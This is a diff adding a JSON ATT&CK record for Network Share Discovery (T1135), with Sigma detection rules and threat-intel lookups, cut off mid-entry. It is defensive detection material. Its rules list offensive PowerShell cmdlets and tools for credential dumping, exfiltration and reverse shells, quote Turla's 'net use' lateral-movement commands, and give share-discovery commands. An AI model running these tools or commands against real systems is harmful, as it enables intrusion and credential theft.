@@ -1,0 +1,551 @@
+{
+    "id": "T1135",
+    "name": "Network Share Discovery",
+    "description": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network.\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](S0039) can be used to query a remote system for available shared drives using the `net view \\\\remotesystem` command. It can also be used to query shared drives on the local system using `net share`. For macOS, the `sharing -l` command lists all shared points used for smb services.",
+    "platforms": "macOS, Windows, Linux",
+    "kill_chain_phases": "Discovery",
+    "data_sources": "Process: Process Creation, Command: Command Execution, Process: OS API Execution",
+    "detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](T1047) and [PowerShell](T1059.001).",
+    "url": "https://attack.mitre.org/techniques/T1135",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1135",
+                "atomic_attack_guid": "d07e4cc1-98ae-447e-9d31-36cb430d28c4",
+                "atomic_attack_name": "PowerView ShareFinder",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Malicious PowerShell Commandlets - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_malicious_cmdlets.yml",
+                        "remote_content": "title: Malicious PowerShell Commandlets - ProcessCreation\nid: 02030f2f-6199-49ec-b258-ea71b07e03dc\nrelated:\n    - id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n      type: derived\n    - id: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\n      type: similar\nstatus: test\ndescription: Detects Commandlet names from well-known PowerShell exploitation frameworks\nreferences:\n    - https://adsecurity.org/?p=2921\n    - https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n    - https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n    - https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n    - https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n    - https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n    - https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/ # Invoke-TotalExec\n    - https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/ # Invoke-TotalExec\n    - https://github.com/calebstewart/CVE-2021-1675 # Invoke-Nightmare\n    - https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n    - https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n    - https://github.com/HarmJ0y/DAMP\n    - https://github.com/samratashok/nishang\n    - https://github.com/DarkCoderSc/PowerRunAsSystem/\n    - https://github.com/besimorhino/powercat\n    - https://github.com/Kevin-Robertson/Powermad\n    - https://github.com/adrecon/ADRecon\n    - https://github.com/adrecon/AzureADRecon\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-02\nmodified: 2024-01-25\ntags:\n    - attack.execution\n    - attack.discovery\n    - attack.t1482\n    - attack.t1087\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1069\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        # Note: Please ensure alphabetical order when adding new entries\n        CommandLine|contains:\n            - 'Add-Exfiltration'\n            - 'Add-Persistence'\n            - 'Add-RegBackdoor'\n            - 'Add-RemoteRegBackdoor'\n            - 'Add-ScrnSaveBackdoor'\n            - 'Check-VM'\n            - 'ConvertTo-Rc4ByteStream'\n            - 'Decrypt-Hash'\n            - 'Disable-ADIDNSNode'\n            - 'Disable-MachineAccount'\n            - 'Do-Exfiltration'\n            - 'Enable-ADIDNSNode'\n            - 'Enable-MachineAccount'\n            - 'Enabled-DuplicateToken'\n            - 'Exploit-Jboss'\n            - 'Export-ADR'\n            - 'Export-ADRCSV'\n            - 'Export-ADRExcel'\n            - 'Export-ADRHTML'\n            - 'Export-ADRJSON'\n            - 'Export-ADRXML'\n            - 'Find-Fruit'\n            - 'Find-GPOLocation'\n            - 'Find-TrustedDocuments'\n            - 'Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone\n            - 'Get-ApplicationHost'\n            - 'Get-ChromeDump'\n            - 'Get-ClipboardContents'\n            - 'Get-FoxDump'\n            - 'Get-GPPPassword'\n            - 'Get-IndexedItem'\n            - 'Get-KerberosAESKey'\n            - 'Get-Keystrokes'\n            - 'Get-LSASecret'\n            - 'Get-MachineAccountAttribute'\n            - 'Get-MachineAccountCreator'\n            - 'Get-PassHashes'\n            - 'Get-RegAlwaysInstallElevated'\n            - 'Get-RegAutoLogon'\n            - 'Get-RemoteBootKey'\n            - 'Get-RemoteCachedCredential'\n            - 'Get-RemoteLocalAccountHash'\n            - 'Get-RemoteLSAKey'\n            - 'Get-RemoteMachineAccountHash'\n            - 'Get-RemoteNLKMKey'\n            - 'Get-RickAstley'\n            - 'Get-Screenshot'\n            - 'Get-SecurityPackages'\n            - 'Get-ServiceFilePermission'\n            - 'Get-ServicePermission'\n            - 'Get-ServiceUnquoted'\n            - 'Get-SiteListPassword'\n            - 'Get-System'\n            - 'Get-TimedScreenshot'\n            - 'Get-UnattendedInstallFile'\n            - 'Get-Unconstrained'\n            - 'Get-USBKeystrokes'\n            - 'Get-VaultCredential'\n            - 'Get-VulnAutoRun'\n            - 'Get-VulnSchTask'\n            - 'Grant-ADIDNSPermission'\n            - 'Gupt-Backdoor'\n            - 'HTTP-Login'\n            - 'Install-ServiceBinary'\n            - 'Install-SSP'\n            - 'Invoke-ACLScanner'\n            - 'Invoke-ADRecon'\n            - 'Invoke-ADSBackdoor'\n            - 'Invoke-AgentSmith'\n            - 'Invoke-AllChecks'\n            - 'Invoke-ARPScan'\n            - 'Invoke-AzureHound'\n            - 'Invoke-BackdoorLNK'\n            - 'Invoke-BadPotato'\n            - 'Invoke-BetterSafetyKatz'\n            - 'Invoke-BypassUAC'\n            - 'Invoke-Carbuncle'\n            - 'Invoke-Certify'\n            - 'Invoke-ConPtyShell'\n            - 'Invoke-CredentialInjection'\n            - 'Invoke-DAFT'\n            - 'Invoke-DCSync'\n            - 'Invoke-DinvokeKatz'\n            - 'Invoke-DllInjection'\n            - 'Invoke-DNSUpdate'\n            - 'Invoke-DomainPasswordSpray'\n            - 'Invoke-DowngradeAccount'\n            - 'Invoke-EgressCheck'\n            - 'Invoke-Eyewitness'\n            - 'Invoke-FakeLogonScreen'\n            - 'Invoke-Farmer'\n            - 'Invoke-Get-RBCD-Threaded'\n            - 'Invoke-Gopher'\n            - 'Invoke-Grouper' # Also Covers Invoke-GrouperX\n            - 'Invoke-HandleKatz'\n            - 'Invoke-ImpersonatedProcess'\n            - 'Invoke-ImpersonateSystem'\n            - 'Invoke-InteractiveSystemPowerShell'\n            - 'Invoke-Internalmonologue'\n            - 'Invoke-Inveigh'\n            - 'Invoke-InveighRelay'\n            - 'Invoke-KrbRelay'\n            - 'Invoke-LdapSignCheck'\n            - 'Invoke-Lockless'\n            - 'Invoke-MalSCCM'\n            - 'Invoke-Mimikatz'\n            - 'Invoke-Mimikittenz'\n            - 'Invoke-MITM6'\n            - 'Invoke-NanoDump'\n            - 'Invoke-NetRipper'\n            - 'Invoke-Nightmare'\n            - 'Invoke-NinjaCopy'\n            - 'Invoke-OfficeScrape'\n            - 'Invoke-OxidResolver'\n            - 'Invoke-P0wnedshell'\n            - 'Invoke-Paranoia'\n            - 'Invoke-PortScan'\n            - 'Invoke-PoshRatHttp' # Also Covers Invoke-PoshRatHttps\n            - 'Invoke-PostExfil'\n            - 'Invoke-PowerDump'\n            - 'Invoke-PowerShellTCP'\n            - 'Invoke-PowerShellWMI'\n            - 'Invoke-PPLDump'\n            - 'Invoke-PsExec'\n            - 'Invoke-PSInject'\n            - 'Invoke-PsUaCme'\n            - 'Invoke-ReflectivePEInjection'\n            - 'Invoke-ReverseDNSLookup'\n            - 'Invoke-Rubeus'\n            - 'Invoke-RunAs'\n            - 'Invoke-SafetyKatz'\n            - 'Invoke-SauronEye'\n            - 'Invoke-SCShell'\n            - 'Invoke-Seatbelt'\n            - 'Invoke-ServiceAbuse'\n            - 'Invoke-ShadowSpray'\n            - 'Invoke-Sharp' # Covers all \"Invoke-Sharp\" variants\n            - 'Invoke-Shellcode'\n            - 'Invoke-SMBScanner'\n            - 'Invoke-Snaffler'\n            - 'Invoke-Spoolsample'\n            - 'Invoke-SpraySinglePassword'\n            - 'Invoke-SSHCommand'\n            - 'Invoke-StandIn'\n            - 'Invoke-StickyNotesExtract'\n            - 'Invoke-SystemCommand'\n            - 'Invoke-Tasksbackdoor'\n            - 'Invoke-Tater'\n            - 'Invoke-Thunderfox'\n            - 'Invoke-ThunderStruck'\n            - 'Invoke-TokenManipulation'\n            - 'Invoke-Tokenvator'\n            - 'Invoke-TotalExec'\n            - 'Invoke-UrbanBishop'\n            - 'Invoke-UserHunter'\n            - 'Invoke-VoiceTroll'\n            - 'Invoke-Whisker'\n            - 'Invoke-WinEnum'\n            - 'Invoke-winPEAS'\n            - 'Invoke-WireTap'\n            - 'Invoke-WmiCommand'\n            - 'Invoke-WMIExec'\n            - 'Invoke-WScriptBypassUAC'\n            - 'Invoke-Zerologon'\n            - 'MailRaider'\n            - 'New-ADIDNSNode'\n            - 'New-DNSRecordArray'\n            - 'New-HoneyHash'\n            - 'New-InMemoryModule'\n            - 'New-MachineAccount'\n            - 'New-SOASerialNumberArray'\n            - 'Out-Minidump'\n            - 'Port-Scan'\n            - 'PowerBreach'\n            - 'powercat '\n            - 'PowerUp'\n            - 'PowerView'\n            - 'Remove-ADIDNSNode'\n            - 'Remove-MachineAccount'\n            - 'Remove-Update'\n            - 'Rename-ADIDNSNode'\n            - 'Revoke-ADIDNSPermission'\n            - 'Set-ADIDNSNode' # Covers: Set-ADIDNSNodeAttribute, Set-ADIDNSNodeOwner\n            - 'Set-MacAttribute'\n            - 'Set-MachineAccountAttribute'\n            - 'Set-Wallpaper'\n            - 'Show-TargetScreen'\n            - 'Start-CaptureServer'\n            - 'Start-Dnscat2'\n            - 'Start-WebcamRecorder'\n            - 'VolumeShadowCopyTools'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious Program Names",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_progname.yml",
+                        "remote_content": "title: Suspicious Program Names\nid: efdd8dd5-cee8-4e59-9390-7d4d5e4dd6f6\nstatus: test\ndescription: Detects suspicious patterns in program names or folders that are often found in malicious samples or hacktools\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1560.001/T1560.001.md\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-11\nmodified: 2023-03-22\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_image:\n        - Image|contains:\n              - '\\CVE-202' # Update this when we reach the year 2100\n              - '\\CVE202' # Update this when we reach the year 2100\n        - Image|endswith:\n              - '\\poc.exe'\n              - '\\artifact.exe'\n              - '\\artifact64.exe'\n              - '\\artifact_protected.exe'\n              - '\\artifact32.exe'\n              - '\\artifact32big.exe'\n              - 'obfuscated.exe'\n              - 'obfusc.exe'\n              - '\\meterpreter'\n    selection_commandline:\n        CommandLine|contains:\n            - 'inject.ps1'\n            - 'Invoke-CVE'\n            - 'pupy.ps1'\n            - 'payload.ps1'\n            - 'beacon.ps1'\n            - 'PowerView.ps1'\n            - 'bypass.ps1'\n            - 'obfuscated.ps1'\n            - 'obfusc.ps1'\n            - 'obfus.ps1'\n            - 'obfs.ps1'\n            - 'evil.ps1'\n            - 'MiniDogz.ps1'\n            - '_enc.ps1'\n            - '\\shell.ps1'\n            - '\\rshell.ps1'\n            - 'revshell.ps1'\n            - '\\av.ps1'\n            - '\\av_test.ps1'\n            - 'adrecon.ps1'\n            - 'mimikatz.ps1'\n            - '\\PowerUp_'\n            - 'powerup.ps1'\n            - '\\Temp\\a.ps1'\n            - '\\Temp\\p.ps1'\n            - '\\Temp\\1.ps1'\n            - 'Hound.ps1'\n            - 'encode.ps1'\n            - 'powercat.ps1'\n    condition: 1 of selection*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - CurrentDirectory\nfalsepositives:\n    - Legitimate tools that accidentally match on the searched patterns\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Import New Module Via PowerShell CommandLine",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_powershell_import_module.yml",
+                        "remote_content": "title: Import New Module Via PowerShell CommandLine\nid: 4ad74d01-f48c-42d0-b88c-b31efa4d2262\nstatus: test\ndescription: Detects usage of the \"Import-Module\" cmdlet in order to add new Cmdlets to the current PowerShell session\nreferences:\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.3\n    - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-5.1\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-05-09\nmodified: 2023-12-01\ntags:\n    - attack.execution\n    - detection.threat-hunting\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cmdlet:\n        CommandLine|contains:\n            - 'Import-Module '\n            - 'ipmo '\n    filter_main_vsstudio:\n        ParentImage|contains:\n            - ':\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_'\n            - ':\\Windows\\System32\\cmd.exe'\n        CommandLine|contains|all:\n            - ':\\Program Files\\Microsoft Visual Studio\\'\n            - 'Tools\\Microsoft.VisualStudio.DevShell.dll'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Depending on the environement, many legitimate scripts will import modules inline. This rule is targeted for hunting purposes.\nlevel: low\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1135",
+                "atomic_attack_guid": "ab39a04f-0c93-4540-9ff2-83f862c385ae",
+                "atomic_attack_name": "View available share drives",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Net.EXE Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules-threat-hunting/windows/process_creation/proc_creation_win_net_execution.yml",
+                        "remote_content": "title: Net.EXE Execution\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nstatus: test\ndescription: Detects execution of \"Net.EXE\".\nreferences:\n    - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n    - https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n    - https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nauthor: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community (improvements)\ndate: 2019-01-16\nmodified: 2022-07-11\ntags:\n    - attack.discovery\n    - attack.t1007\n    - attack.t1049\n    - attack.t1018\n    - attack.t1135\n    - attack.t1201\n    - attack.t1069.001\n    - attack.t1069.002\n    - attack.t1087.001\n    - attack.t1087.002\n    - attack.lateral-movement\n    - attack.t1021.002\n    - attack.s0039\n    - detection.threat-hunting\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' accounts'\n            - ' group'\n            - ' localgroup'\n            - ' share'\n            - ' start'\n            - ' stop '\n            - ' user'\n            - ' view'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low\n"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1135",
+                "atomic_attack_guid": "20f1097d-81c1-405c-8380-32174d493bbb",
+                "atomic_attack_name": "Network Share Discovery command prompt",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Windows Share Mount Via Net.EXE",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_net_use_mount_share.yml",
+                        "remote_content": "title: Windows Share Mount Via Net.EXE\nid: f117933c-980c-4f78-b384-e3d838111165\nrelated:\n    - id: 3abd6094-7027-475f-9630-8ab9be7b9725\n      type: similar\nstatus: test\ndescription: Detects when a share is mounted using the \"net.exe\" utility\nreferences:\n    - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-02\nmodified: 2023-02-21\ntags:\n    - attack.lateral-movement\n    - attack.t1021.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\net.exe'\n              - '\\net1.exe'\n        - OriginalFileName:\n              - 'net.exe'\n              - 'net1.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' use '\n            - ' \\\\\\\\'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate activity by administrators and scripts\nlevel: low\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                    "02a470d8-493e-41d9-8367-622460dddbe8",
+                    "5d9b516c-e5f0-4e7c-a958-5d8c0a019371",
+                    "54773c5f-f1cc-4703-9126-2f797d96a69d",
+                    "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
+                    "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                    "c601f20d-570a-4cde-a7d6-e17f99cb8e7f",
+                    "5ee3822c-6828-418c-b619-62de950d210f",
+                    "3489cfc5-640f-4bb3-a103-9137b97de79f",
+                    "bef37fa2-f205-4a7b-b484-0759bfd5f86f",
+                    "5e55be1a-3a30-48ae-9934-4199950d210f",
+                    "75925535-ca97-4e0a-a850-00b5c00779dc",
+                    "5d6e7aa3-aca4-46cc-b96a-46ac950d210f",
+                    "83e15192-96d8-476c-aa39-0317de8dba80",
+                    "1f34230d-b6ae-4dc7-8599-78c18820bd21",
+                    "e6eb5a96-9e6f-4a18-9cdd-642cfda21c8e",
+                    "5e78dc2c-afc8-411f-94a5-40bb950d210f"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                        "lookup_data": {
+                            "description": "Dissecting PlugX to Extract Its Crown Jewels",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5eeec9aa-9d88-4ece-9e6f-9d92884ae404.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1663580963",
+                            "uuid": "5eeec9aa-9d88-4ece-9e6f-9d92884ae404",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "02a470d8-493e-41d9-8367-622460dddbe8",
+                        "lookup_data": {
+                            "description": "Ransomware Attack Irish on Health Sector",
+                            "link": "http://www.botvrij.eu/data/feed-osint/02a470d8-493e-41d9-8367-622460dddbe8.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1621676993",
+                            "uuid": "02a470d8-493e-41d9-8367-622460dddbe8",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5d9b516c-e5f0-4e7c-a958-5d8c0a019371",
+                        "lookup_data": {
+                            "description": "Operation Ghost - White Paper",
+                            "link": "http://www.botvrij.eu/data/feed-osint/5d9b516c-e5f0-4e7c-a958-5d8c0a019371.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1571855044",
+                            "uuid": "5d9b516c-e5f0-4e7c-a958-5d8c0a019371",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "54773c5f-f1cc-4703-9126-2f797d96a69d",
+                        "lookup_data": {
+                            "description": "Detects the use of Advanced Port Scanner.",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021/12/18\ndescription: Detects the use of Advanced Port Scanner.\ndetection:\n  condition: 1 of selection*\n  selection1:\n  - Image|contains: \\advanced_port_scanner\n  - OriginalFileName|contains: advanced_port_scanner\n  - Description|contains: Advanced Port Scanner\n  selection2:\n    CommandLine|contains|all:\n    - /portable\n    - /lng\nfalsepositives:\n- Legitimate administrative use\n- Tools with similar commandline (very rare)\nid: 54773c5f-f1cc-4703-9126-2f797d96a69d\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/11\nreferences:\n- https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Other/Advanced%20Port%20Scanner\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1046\n- attack.t1135\ntitle: Advanced Port Scanner\n",
+                            "sigma:id": "54773c5f-f1cc-4703-9126-2f797d96a69d",
+                            "title": "Advanced Port Scanner",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
+                        "lookup_data": {
+                            "description": "Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems",
+                            "raw": "author: frack113\ndate: 2021/12/10\ndescription: Adversaries may look for details about the network configuration and\n  settings of systems they access or through information discovery of remote systems\ndetection:\n  condition: selection\n  selection:\n  - OriginalFileName: SharpView.exe\n  - Image|endswith: \\SharpView.exe\n  - CommandLine|contains:\n    - Add-RemoteConnection\n    - Convert-ADName\n    - ConvertFrom-SID\n    - ConvertFrom-UACValue\n    - Convert-SidToName\n    - Export-PowerViewCSV\n    - Find-DomainObjectPropertyOutlier\n    - Find-DomainProcess\n    - Find-DomainShare\n    - Find-DomainUserEvent\n    - Find-DomainUserLocation\n    - Find-ForeignGroup\n    - Find-ForeignUser\n    - Find-GPOComputerAdmin\n    - Find-GPOLocation\n    - Find-Interesting\n    - Find-LocalAdminAccess\n    - Find-ManagedSecurityGroups\n    - Get-CachedRDPConnection\n    - Get-DFSshare\n    - Get-DomainComputer\n    - Get-DomainController\n    - Get-DomainDFSShare\n    - Get-DomainDNSRecord\n    - Get-DomainFileServer\n    - Get-DomainForeign\n    - Get-DomainGPO\n    - Get-DomainGroup\n    - Get-DomainGUIDMap\n    - Get-DomainManagedSecurityGroup\n    - Get-DomainObject\n    - Get-DomainOU\n    - Get-DomainPolicy\n    - Get-DomainSID\n    - Get-DomainSite\n    - Get-DomainSPNTicket\n    - Get-DomainSubnet\n    - Get-DomainTrust\n    - Get-DomainUserEvent\n    - Get-ForestDomain\n    - Get-ForestGlobalCatalog\n    - Get-ForestTrust\n    - Get-GptTmpl\n    - Get-GroupsXML\n    - Get-LastLoggedOn\n    - Get-LoggedOnLocal\n    - Get-NetComputer\n    - Get-NetDomain\n    - Get-NetFileServer\n    - Get-NetForest\n    - Get-NetGPO\n    - Get-NetGroupMember\n    - Get-NetLocalGroup\n    - Get-NetLoggedon\n    - Get-NetOU\n    - Get-NetProcess\n    - Get-NetRDPSession\n    - Get-NetSession\n    - Get-NetShare\n    - Get-NetSite\n    - Get-NetSubnet\n    - Get-NetUser\n    - Get-PathAcl\n    - Get-PrincipalContext\n    - Get-RegistryMountedDrive\n    - Get-RegLoggedOn\n    - Get-WMIRegCachedRDPConnection\n    - Get-WMIRegLastLoggedOn\n    - Get-WMIRegMountedDrive\n    - Get-WMIRegProxy\n    - Invoke-ACLScanner\n    - Invoke-CheckLocalAdminAccess\n    - Invoke-Kerberoast\n    - Invoke-MapDomainTrust\n    - Invoke-RevertToSelf\n    - Invoke-Sharefinder\n    - Invoke-UserImpersonation\n    - Remove-DomainObjectAcl\n    - Remove-RemoteConnection\n    - Request-SPNTicket\n    - Set-DomainObject\n    - Test-AdminAccess\nfalsepositives:\n- Unknown\nid: b2317cfa-4a47-4ead-b3ff-297438c0bc2d\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/30\nreferences:\n- https://github.com/tevora-threat/SharpView/\n- https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1049/T1049.md#atomic-test-4---system-discovery-using-sharpview\nrelated:\n- id: dcd74b95-3f36-4ed9-9598-0490951643aa\n  type: similar\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1049\n- attack.t1069.002\n- attack.t1482\n- attack.t1135\n- attack.t1033\ntitle: Suspicious Execution of SharpView\n",
+                            "sigma:id": "b2317cfa-4a47-4ead-b3ff-297438c0bc2d",
+                            "title": "Suspicious Execution of SharpView",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                        "lookup_data": {
+                            "description": "Detects execution of Net.exe, whether suspicious or benign.",
+                            "raw": "author: Michael Haag, Mark Woan (improvements), James Pemberton / @4A616D6573 / oscd.community\n  (improvements)\ndate: 2019/01/16\ndescription: Detects execution of Net.exe, whether suspicious or benign.\ndetection:\n  condition: all of selection_*\n  selection_cli:\n    CommandLine|contains:\n    - ' group'\n    - ' localgroup'\n    - ' user'\n    - ' view'\n    - ' share'\n    - ' accounts'\n    - ' stop '\n    - ' start'\n  selection_img:\n  - Image|endswith:\n    - \\net.exe\n    - \\net1.exe\n  - OriginalFileName:\n    - net.exe\n    - net1.exe\nfalsepositives:\n- Will need to be tuned. If using Splunk, I recommend | stats count by Computer,CommandLine\n  following the search for easy hunting by computer/CommandLine.\nfields:\n- ComputerName\n- User\n- CommandLine\n- ParentCommandLine\nid: 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/11\nreferences:\n- https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/\n- https://eqllib.readthedocs.io/en/latest/analytics/4d2e7fc1-af0b-4915-89aa-03d25ba7805e.html\n- https://eqllib.readthedocs.io/en/latest/analytics/e61f557c-a9d0-4c25-ab5b-bbc46bb24deb.html\n- https://eqllib.readthedocs.io/en/latest/analytics/9b3dd402-891c-4c4d-a662-28947168ce61.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1007/T1007.md#atomic-test-2---system-service-discovery---netexe\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1007\n- attack.t1049\n- attack.t1018\n- attack.t1135\n- attack.t1201\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1087.001\n- attack.t1087.002\n- attack.lateral_movement\n- attack.t1021.002\n- attack.s0039\ntitle: Net.exe Execution\n",
+                            "sigma:id": "183e7ea8-ac4b-4c23-9aec-b3dac4e401ac",
+                            "title": "Net.exe Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c601f20d-570a-4cde-a7d6-e17f99cb8e7f",
+                        "lookup_data": {
+                            "description": "Detects automated lateral movement by Turla group",
+                            "raw": "author: Markus Neis\ndate: 2017/11/07\ndescription: Detects automated lateral movement by Turla group\ndetection:\n  condition: selection\n  selection:\n    CommandLine:\n    - net use \\\\\\\\%DomainController%\\C$ \"P@ssw0rd\" *\n    - dir c:\\\\*.doc* /s\n    - dir %TEMP%\\\\*.exe\nfalsepositives:\n- Unknown\nid: c601f20d-570a-4cde-a7d6-e17f99cb8e7f\nlevel: critical\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://securelist.com/the-epic-turla-operation/65545/\nstatus: test\ntags:\n- attack.g0010\n- attack.execution\n- attack.t1059\n- attack.lateral_movement\n- attack.t1021.002\n- attack.discovery\n- attack.t1083\n- attack.t1135\ntitle: Turla Group Lateral Movement\n",
+                            "sigma:id": "c601f20d-570a-4cde-a7d6-e17f99cb8e7f",
+                            "title": "Turla Group Lateral Movement",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5ee3822c-6828-418c-b619-62de950d210f",
+                        "lookup_data": {
+                            "description": "Dharma Ransomware Event",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5ee3822c-6828-418c-b619-62de950d210f.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1592742357",
